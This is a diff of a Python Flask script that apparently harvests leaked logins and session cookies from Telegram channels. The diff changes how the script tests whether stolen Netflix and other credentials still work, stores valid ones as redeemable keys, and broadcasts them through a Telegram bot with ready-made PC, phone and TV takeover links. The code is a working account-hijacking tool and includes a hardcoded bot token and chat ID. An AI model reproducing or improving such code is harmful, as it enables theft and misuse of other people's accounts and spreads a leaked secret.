@@ -12,6 +12,7 @@ from concurrent.futures import ThreadPoolExecutor
 
 app = Flask(__name__)
 
+# CLOUD BOT TOKEN (GodDrop)
 BOT_TOKEN = '8980059554:AAGi4797fL5HA4HIfFO74HFhEEmt6A2OoUQ'
 CHAT_ID = '6584278242'
 
@@ -60,32 +61,48 @@ def get_platform(item):
 
 def test_item(item):
     if ':' in item and '@' in item: return True
-    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
     try:
         if item.startswith('http'):
-            r = requests.get(item, headers=headers, allow_redirects=False, timeout=5)
-            if r.status_code in [200, 301, 302] and 'login' not in r.headers.get('Location', '') and 'unsupported' not in r.headers.get('Location', ''):
-                return True
+            r = requests.get(item, headers=headers, allow_redirects=True, timeout=10)
+            if 'login' in r.url.lower() or 'signin' in r.url.lower() or 'unsupported' in r.url.lower():
+                return False
+            return True
         else:
             headers['Cookie'] = item
-            r = requests.get('https://www.netflix.com/browse', headers=headers, allow_redirects=False, timeout=5)
-            if r.status_code == 200 and 'login' not in r.headers.get('Location', ''):
-                return True
-    except: pass
-    return False
+            r = requests.get('https://www.netflix.com/browse', headers=headers, allow_redirects=True, timeout=10)
+            if 'login' in r.url.lower(): return False
+            return True
+    except: return False
 
 def build_telegram_msg(item, platform, key):
-    if ':' in item and '@' in item:
+    msg = f"🚨 <b>{platform.upper()} FUND</b> 🚨\n\n"
+    msg += f"🔑 <b>Key:</b> <code>{key}</code>\n"
+    msg += f"🌐 <b>Einlösen:</b> <a href='https://multi-cloud-final.onrender.com'>Hier klicken</a>\n\n"
+    
+    if platform == "netflix" and "nftoken=" in item:
+        try:
+            token = item.split("nftoken=")[1].split("&")[0]
+            pc_link = f"https://www.netflix.com/browse?nftoken={token}"
+            mobile_link = f"https://www.netflix.com/browse?nftoken={token}&mobile=true"
+            tv_link = f"https://www.netflix.com/tv2?nftoken={token}"
+            
+            msg += f"💻 <b>PC Browser:</b>\n<a href='{pc_link}'>PC-Link öffnen</a>\n\n"
+            msg += f"📱 <b>Handy:</b>\n<a href='{mobile_link}'>Handy-Link öffnen</a>\n\n"
+            msg += f"📺 <b>Smart TV:</b>\n<a href='{tv_link}'>TV-Link öffnen</a>\n"
+        except:
+            msg += f"🔗 <b>Link:</b> <a href='{item}'>Account öffnen</a>\n"
+
+    elif ':' in item and '@' in item:
         email, password = item.split(':', 1)
-        msg = f"🚨 <b>{platform.upper()} LOGIN FUND!</b>\n\n"
-        msg += f"🔑 <b>Key:</b> <code>{key}</code>\n"
         msg += f"📧 <b>E-Mail:</b> <code>{email}</code>\n"
-        msg += f"🔒 <b>Passwort:</b> <code>{password}</code>\n"
+        msg += f"🔒 <b>Passwort:</b> <code>{password}</code>\n\n"
+        msg += f"📱 <b>Gerät:</b> Funktioniert auf <b>PC, Handy & TV</b> (einfach einloggen)."
+        
     else:
-        msg = f"🚨 <b>{platform.upper()} LINK FUND!</b>\n\n"
-        msg += f"🔑 <b>Key:</b> <code>{key}</code>\n"
-        msg += f"🔗 <b>Link:</b> <a href='{item}'>Hier klicken</a>\n"
-        msg += f"<code>{item[:100]}...</code>\n"
+        msg += f"🔗 <b>Direkt-Link:</b> <a href='{item}'>Account öffnen</a>\n"
+        msg += f"📱 <b>Hinweis:</b> Funktioniert am besten im <b>PC Browser</b>."
+        
     return msg
 
 def scan_telegram(channel):
@@ -117,7 +134,7 @@ def grabber_loop():
                     requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": platform})
                     try: 
                         msg = build_telegram_msg(item, platform, newKey)
-                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})
+                        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True})
                     except: pass
         time.sleep(60)
 
